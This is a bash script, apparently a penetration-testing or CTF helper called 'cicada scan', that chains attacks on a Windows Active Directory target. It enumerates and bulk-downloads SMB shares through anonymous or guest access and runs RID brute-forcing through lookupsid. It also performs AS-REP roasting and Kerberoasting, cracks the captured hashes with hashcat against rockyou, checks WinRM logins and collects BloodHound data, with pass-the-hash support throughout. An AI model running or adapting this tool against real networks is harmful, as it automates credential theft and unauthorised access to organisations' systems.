#!/bin/bash 

# declare variables
username=''
password=''
domain=''
target=''
hash=''
pass_wordlist='/usr/share/wordlists/rockyou.txt'
full_enabled=false
smb_enabled=false
kerberos_enabled=false
ldap_enabled=false
crack_enabled=false
winrm_enabled=false
bloodhound_enabled=false

# declare colors 
RED="\033[1;31m"
BLUE="\033[1;34m"
RESET="\033[0m"
GREEN="\033[1;32m"
PURPLE="\033[1;35m"
ORANGE="\033[1;33m"
PINK="\033[1;35m"



# display_usage function


banner(){
	  echo " 
	  
		██████╗██╗ ██████╗ █████╗ ██████╗  █████╗ 
		██╔════╝██║██╔════╝██╔══██╗██╔══██╗██╔══██╗
		██║     ██║██║     ███████║██║  ██║███████║
		██║     ██║██║     ██╔══██║██║  ██║██╔══██║
		╚██████╗██║╚██████╗██║  ██║██████╔╝██║  ██║
		╚═════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
			by theblxckcicada
										   
		   ███████╗ ██████╗ █████╗ ███╗   ██╗     
		   ██╔════╝██╔════╝██╔══██╗████╗  ██║     
		   ███████╗██║     ███████║██╔██╗ ██║     
		   ╚════██║██║     ██╔══██║██║╚██╗██║     
		   ███████║╚██████╗██║  ██║██║ ╚████║     
		   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝     
"  
																 
}
enum_smb(){
	# Enumerate SMB Share Drives
	echo -e "${ORANGE} [*] Enumerating SMB...${RESET}"
	echo -e "${PURPLE} [!] Running Crackmapexec${RESET}"
	
	if [ -z "$username" ] || [ -z "$password" ]; then
	    crackmapexec smb $domain -u '' -p '' --shares  > $smb_file
	    
	    if ! [ -s $smb_file ] || grep -q "[-]" "$smb_file"; then
	    	crackmapexec smb $domain -u guest -p '' --shares   > $smb_file
	    fi
	else 
		crackmapexec smb $domain -u $username -p $password --shares  > $smb_file
	fi
	
	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
	    crackmapexec smb $domain -u $username -H $hash --shares  > $smb_file
	fi

	if ! [ -s $smb_file ];then
		echo -e "${RED} [-] Could not list SMB shares"
		rm -rf $smb_file 
	else
		echo -e "${GREEN} [+] SMB Share Drives Results Saved To ${PINK}${smb_file}${RESET}"
	fi
}

enum_winrm(){
	# Enumerate winrm
	echo -e "${ORANGE} [*] Enumerating winrm...${RESET}"
	echo -e "${PURPLE} [!] Trying to log in with winrm using Crackmapexec${RESET}"
	winrm_results=''
	# work with username and password 
	if ! [ -z "$username" ] && ! [ -z "$password" ]; then
	    winrm_results=$(crackmapexec winrm $domain -u $username -p $password | awk '$5 == "[+]" {print $6}')
	    if [ -z $winrm_results ]; then
	    	echo -e "${RED} [-] User $username can not log in with winrm${RESET}"
	    else 
	    	echo -e "${GREEN} [+] User $username can log in with winrm${RESET}"
	    	echo -e "${GREEN} [+] Login to winrm using ${ORANGE}evil-winrm -u  $username -p $password -i $domain ${RESET}"
	    fi
	fi
	
	# work with username and hash
	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
	    winrm_results=$(crackmapexec winrm $domain -u $username -H $hash | awk '$5 == "[+]" {print $6}')
	    if [ -z $winrm_results ]; then
	    	echo -e "${RED} [-] User $username can not log in with winrm${RESET}"
	    else 
		 echo -e "${GREEN} [+] User $username can log in with winrm${RESET}"
		 echo -e "${GREEN} [+] Login to winrm using ${ORANGE} evil-winrm -u  $username -H $hash -i $domain ${RESET}"
	    fi
	fi
	
	
}

smb_conn(){
	if [ -s $smb_file ]; then
		# connect and get a list of share drives
		cat $smb_file | awk '$6 == "READ" && $5 !~ /^(ADMIN\$|C\$|IPC\$)$/ {print $5}' > $smb_shares
		cd $smb_shares_directory
		if [ -s $smb_shares ];then
			while IFS= read -r share; do
				if ! [ -z $share ]; then
					echo -e "${GREEN} [+] Downloading Files From ${PINK} $share ${GREEN} SMB Share...${RESET}"
					if [ -z "$username" ] || [ -z "$password" ]; then
						smbclient //$domain/$share  -c 'prompt OFF;recurse ON;mget *;exit;' -N
					else
						smbclient //$domain/$share  -c 'prompt OFF;recurse ON;mget *;exit;' -U "$username%$password"
					fi
				fi
				
			done < "$smb_shares"
			echo -e "${GREEN} [+] Files saved to  ${PINK} $smb_shares_directory ${RESET}"
		fi
		cd $current_directory
	fi
}

enum_lookup(){
	# Enumerate Lookupsids 
	echo -e "${ORANGE} [*] Enumerating Users With Lookupsids...${RESET}"
	echo -e "${PURPLE} [!] Running lookupsid.py${RESET}"
	
	# work with username and password
	if [ -z "$username" ] || [ -z "$password" ]; then
	    lookupsid.py $domain -no-pass    > $lookupsid_file 
	    if ! [ -s $lookupsid_file ] || grep -q "[-]" "$lookupsid_file"; then
	    	lookupsid.py $domain/guest@$domain -no-pass    > $lookupsid_file
	    fi
	else 
		lookupsid.py $domain/$username:$password@$domain    > $lookupsid_file 
	fi
	
	# work with username and ntlm hash
	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
		lookupsid.py $domain/$username@$domain   -hashes ":$hash" > $lookupsid_file 
	fi
	

	#retrieve users from the file
	cat $lookupsid_file |  awk -F '[:\\\\(\\)]' '/SidTypeUser/ {print $3}' > $users_file

	# Check if we have users in the file
	if  ! [ -s $lookupsid_file ] ||  ! [ -s $users_file ]; then
		echo -e "${RED} [-] Could not retrieve lookupsids and users"
		rm -rf $lookupsid_file $users_file
	else 
		echo -e "${GREEN} [+] Users Results Saved To ${PINK} ${users_file}${RESET}"
		echo -e "${GREEN} [+] Lookupsid Results Saved To ${PINK} ${lookupsid_file}${RESET}"
	fi
}

enum_kerberos(){
	# If we have users we request keberos hashes 
	echo -e "${ORANGE} [*] Kerberosting... Requesting Hashes...${RESET}"
	echo -e "${PURPLE} [!] Running GetNPUsers.py${RESET}"
	#Request hashes using GetNPUsers.py
	if  [ -s $users_file ]; then
		# work with username and password 
		if [ -z "$username" ] || [ -z "$password" ]; then
	    		GetNPUsers.py $domain/guest@$domain -no-pass -usersfile $users_file | grep '^$krb5asrep' > $get_np_users_file
			if ! [ -s $get_np_users_file ] || grep -q "[-] Error" "$get_np_users_file"; then
	    			GetNPUsers.py $domain/$username@$domain -no-pass -usersfile $users_file | grep '^$krb5asrep' > $get_np_users_file 
	    		fi
		else 
			GetNPUsers.py $domain/$username:$password@$domain -usersfile $users_file | grep '^$krb5asrep' > $get_np_users_file 
		fi
		
		# work with username and ntlm hash
		if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
			GetNPUsers.py $domain/$username@$domain -usersfile $users_file  -hashes ":$hash" | grep '^$krb5asrep' > $get_np_users_file 
		fi
		
		echo -e "${GREEN} [+] GetNPUsers Results Saved To ${PINK} ${get_np_users_file}${RESET}"
	else 
		echo -e "${RED} [-] Could not perform kerberoasting with NPUsers"
		rm -rf $get_np_users_file
	fi
	echo -e "${PURPLE} [!] Running GetUserSPNs.py${RESET}"
	# Request hashes using GetUserSPNs.py
	# work with username and password 
	if [ -z "$username" ] || [ -z "$password" ]; then
	    	GetUserSPNs.py $domain/$username@$domain -no-pass -request | grep '^$krb5tgs' > $get_user_spn_file
		if ! [ -s $get_user_spn_file ]; then
	    		 GetUserSPNs.py $domain/guest@$domain -no-pass -request | grep '^$krb5tgs' > $get_user_spn_file 
	    	fi
	else 
	    	GetUserSPNs.py $domain/$username:$password@$domain -request | grep '^$krb5tgs' > $get_user_spn_file  
	fi
	
	# work with username and ntlm hash
	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
		GetUserSPNs.py $domain/$username@$domain -request  -hashes ":$hash" | grep '^$krb5tgs' > $get_user_spn_file  
	fi
	
	if  [ -s $get_user_spn_file ] || grep -q "[-] Error" "$get_user_spn_file"; then
		echo -e "${GREEN} [+] GetUserSPNs Results Saved To ${PINK} ${get_user_spn_file}${RESET}"
	else
		echo -e "${RED} [-] Could not perform kerberoasting with GetUserSPNs"
		rm -rf $get_user_spn_file
	fi
}

crack_pass(){
		# check if NPUsers file is empty 
		if [ -s $get_np_users_file ]; then
			echo -e "${PURPLE} [!] Cracking Password krb5asrep  Hashes with Hashcat${RESET}"
			hashcat $get_np_users_file $pass_wordlist -m 18200  | grep '^$krb5asrep'| uniq  >> $cracked_kerberos_file
			if  ! [ -s $cracked_kerberos_file ]; then
				hashcat $get_np_users_file $pass_wordlist -m 18200 --show | grep '^$krb5asrep' | uniq  >> $cracked_kerberos_file
			fi
			
		fi
		
		# check if GetUserSPNs file is empty 
		if [ -s $get_user_spn_file ]; then
			echo -e "${PURPLE} [!] Cracking Password krb5tgs Hashes with Hashcat${RESET}"
			hashcat $get_user_spn_file $pass_wordlist   -m 13100  | grep '^$krb5tgs' | uniq >> $cracked_kerberos_file
			if ! [ -s $cracked_kerberos_file ]; then
				hashcat $get_user_spn_file $pass_wordlist   -m 13100 --show | grep '^$krb5tgs' | uniq >> $cracked_kerberos_file
			fi
			
		fi
		
		
		if [ -s $cracked_kerberos_file ]; then
			echo -e "${GREEN} [+] Cracked A Few Passwords, Saved To ${PINK} ${cracked_kerberos_file} ${RESET}"
		else
			echo -e "${RED} [-] Could not crack the hashes ${RESET}"
			rm -rf $cracked_kerberos_file
		fi
}
enum_ldap(){
	# Enumerate LDAP 
	echo -e "${ORANGE} [*] Enumerating LDAP...${RESET}"
	dc=$(echo "$domain" | tr '.' ',' | sed 's/^/DC=/' | sed 's/,/,DC=/g')
	echo -e "${PURPLE} [!] Running ldapsearch${RESET}"
	if [ -z "$username" ] || [ -z "$password" ]; then
		ldapsearch -x -H ldap://$domain -D '' -w '' -b $dc > $ldap_file
	else 
		ldapsearch -x -H ldap://$domain -D \'$username\' -w \'$password\' -b $dc > $ldap_file
	fi

	if  [ -s $ldap_file ]; then
		echo -e "${GREEN} [+] Ldap Results Saved To ${PINK} ${ldap_file}${RESET}"
	else
		echo -e "${RED} [-] Could not run ldap"
	fi
}


enum_bloodhound(){
	echo -e "${ORANGE} [*] Enumerating Bloodhound...${RESET}"
	echo -e "${PURPLE} [!] Running bloodhound-python ${RESET}"
	cd $bloodhound_directory
	rm -rf * # remove everything before we begin
	if ! [ -z $username ] && ! [ -z $password ]; then
		bloodhound-python -d $domain -u $username -p $password -ns $target -c all > /dev/null 2>&1
	fi
	# work with username and ntlm hash
	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
		bloodhound-python -d $domain -u $username --hashes ":$hash" -ns $target -c all   > /dev/null 2>&1
	fi
	output=$(ls | grep .json)
	if [ -z "$output" ]; then
		echo -e "${RED} [-] Bloodhound Enumeration was not successful.${RESET}"
	else
		echo -e "${GREEN} [+] Successfully Enumerated Bloodhound. Results saved to ${PINK} $bloodhound_directory ${RESET}"
	fi
	cd $current_directory
}
# remove empty files and folders 
remove_empty(){
	find $base_directory -depth -empty -delete
}

# Function to display display_usage information
display_usage() {
    echo -e "${PURPLE}Usage: ${ORANGE}$0 -u 'username' -p 'password' -t 'target' -H 'ntlm hash' -w 'wordlist' [--full] [--crack] [--shares] [--ldap] [--smb] [--winrm] [--bloodhound]${RESET}"
    echo -e  "${GREEN}Options:"
    echo -e  "  -u          	Username for authentication"
    echo -e  "  -p          	Password for authentication"
    echo -e  "  -H          	NTLM Hash for authentication"
    echo -e  "  -t          	Target host or IP address"
    echo -e  "  -w          	Password list (default: rockyou.txt)"
    echo -e  "  --kerberos          Enable kerberoasting mode"
    echo -e  "  --ldap          	Enable LDAP mode Enumeration"
    echo -e  "  --smb          	Enable SMB mode Enumeration"
    echo -e  "  --full          	Enable full mode Enumeration"
    echo -e  "  --winrm          	Enable winrm mode Enumeration"
    echo -e  "  --bloodhound          Enable bloodhound mode Enumeration"
    echo -e  "  --crack          	Crack Found Hashes"
    echo -e  "  -h          	Display this help message"
    exit
}

# Parse command-line options
while getopts ":u:p:t:w:H:-:h" opt; do
    case $opt in
        u) username="$OPTARG" ;;
        p) password="$OPTARG" ;;
        t) target="$OPTARG" ;;
        w) wordlist="$OPTARG" ;;
        H) hash="$OPTARG" ;;
        -)
            case "${OPTARG}" in
                kerberos|ldap|smb|full|crack|winrm|bloodhound) eval "${OPTARG}_enabled=true" ;;
                *) echo "Unknown option: --${OPTARG}" >&2; exit 1 ;;
            esac
            ;;
        h) display_usage; exit 0 ;;
        :) echo "Option -$OPTARG requires an argument." >&2; exit 1 ;;
        ?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
    esac
done

# Check if credentials are null 
if [ -z "$target" ]; then
    display_usage
fi



# declare directories 
current_directory=`pwd`
base_directory=$current_directory/cicada_scan
target_directory=$base_directory/$target
smb_directory=$target_directory/smb_results
lookupsid_directory=$target_directory/lookupsid_results
kerberos_directory=$target_directory/kerberos_results
ldap_directory=$target_directory/ldap_results
smb_shares_directory=$smb_directory/smb
bloodhound_directory=$target_directory/bloodhound_results

# declare file names 
get_np_users_file=$kerberos_directory/"GetNPUsers_results.txt"
get_user_spn_file=$kerberos_directory/"GetUserSPNs_results.txt"
ldap_file=$ldap_directory/"ldap_results.txt"
cracked_kerberos_file=$kerberos_directory/"NPUsers_cracked.txt"
lookupsid_file=$lookupsid_directory/"lookupsid_file.txt"
users_file=$lookupsid_directory/"users.txt"
smb_file=$smb_directory/"share_drives.txt"
smb_shares=$smb_directory/"share_names.txt"




# Create directories if they do not exist 
if [ ! -d "$base_directory" ];then
	mkdir $base_directory
fi 

if [ ! -d "$target_directory" ];then
	mkdir $target_directory
fi 

if [ ! -d "$smb_directory" ];then
	mkdir $smb_directory
fi 

if [ ! -d "$smb_shares_directory" ];then
	mkdir $smb_shares_directory
fi 

if [ ! -d "$lookupsid_directory" ];then
	mkdir $lookupsid_directory
fi 
if [ ! -d "$kerberos_directory" ];then
	mkdir $kerberos_directory
fi 
if [ ! -d "$ldap_directory" ];then
	mkdir $ldap_directory
fi 
if [ ! -d "$bloodhound_directory" ];then
	mkdir $bloodhound_directory
fi 

# display the banner
banner

# grep the domain
domain=$(crackmapexec smb $target -u '' -p '' | grep -oP '(?<=domain:)[^)]+')

grep -q "$domain$" /etc/hosts || { echo -e "${ORANGE} [+][+] Add '$target $domain' to /etc/hosts ${RESET}"; exit 1; }

#echo -e "${ORANGE} [+][+] Add '$target $domain' to /etc/hosts" 
if ! [ -z "$domain" ]; then
	echo -e "${GREEN} [+] Enumerating ${ORANGE}$target${RESET} with   ${ORANGE}$domain${RESET}" 
	if $full_enabled;then
		enum_smb
		smb_conn
		enum_winrm
		enum_lookup
		enum_kerberos
		crack_pass
		enum_bloodhound
		enum_ldap
		remove_empty
		exit
	fi
	if $smb_enabled;then
		enum_smb
		smb_conn
	fi
	if $kerberos_enabled;then
		enum_lookup
		enum_kerberos
		if $crack_enabled;then
			crack_pass
		fi
	fi
	if $ldap_enabled;then
		enum_ldap
	fi
	if $winrm_enabled;then
		enum_winrm
	fi
	if $bloodhound_enabled;then
		enum_bloodhound
	fi
	if $crack_enabled;then
		crack_pass
	fi
	remove_empty
	
else
	echo -e "${RED} [-] Make sure port (445 or 139 for smb) or (639 for ldap)  or (88 for kerberos) are open on the target $target ${RESET}"
fi







